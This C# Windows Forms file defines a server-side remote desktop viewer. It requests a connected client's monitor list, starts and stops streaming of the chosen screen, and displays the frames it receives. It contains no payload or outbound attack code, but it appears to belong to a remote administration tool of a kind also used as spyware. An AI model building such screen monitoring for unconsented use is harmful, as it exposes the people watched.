using Serveur.Controllers;
using Serveur.Controllers.Server;
using System;
using System.Drawing;
using System.Windows.Forms;

namespace Serveur.Views
{
    public partial class FrmRemoteDesktop : Form
    {
        private ClientMosaic _client;
        private int _screens;
        public bool stopRdp = false;

        public FrmRemoteDesktop(ClientMosaic client)
        {
            client.value.frmRdp = this;
            _client = client;
            InitializeComponent();
        }

        private void FrmRemoteDesktop_Load(object sender, System.EventArgs e)
        {
            if (_client.value != null)
            {
                setToolStrip(false);
                new Packets.ServerPackets.GetMonitors().Execute(_client);
            }
        }

        private void FrmRemoteDesktop_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (!pbRdp.IsDisposed && !pbRdp.Disposing)            
                pbRdp.Dispose();
            if (_client.value != null)
                _client.value.frmRdp = null;
            setToolStrip(false);
        }

        //BUTTONS
        private void btnStart_Click(object sender, EventArgs e)
        {
            setToolStrip(true);
            FrmRemoteDesktopController.getDesktop(_client, cbMonitors.SelectedIndex);
        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            setToolStrip(false);
        }

        //CALLBACK
        public void cleanComboBox()
        {
            try
            {
                tsRdp.Invoke((MethodInvoker)delegate
                {
                    cbMonitors.Items.Clear();
                });
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }

        public void addScreens(int screens)
        {
            this._screens = screens;
            try
            {
                tsRdp.Invoke((MethodInvoker)delegate
                {
                    for (int i = 0; i < _screens; i++)
                    {
                        cbMonitors.Items.Add(string.Format("Monitor {0}", i + 1));
                    }
                    cbMonitors.SelectedIndex = 0;
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        public void updateRdp(Image desktop)
        {
            try
            {
                pbRdp.Invoke((MethodInvoker)delegate
                {
                    pbRdp.Image = desktop;
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        public void setToolStrip(bool state)
        {
            cbMonitors.Enabled = !state;
            btnStart.Enabled = !state;
            btnStop.Enabled = state;
            stopRdp = !state;
        }
    }
}
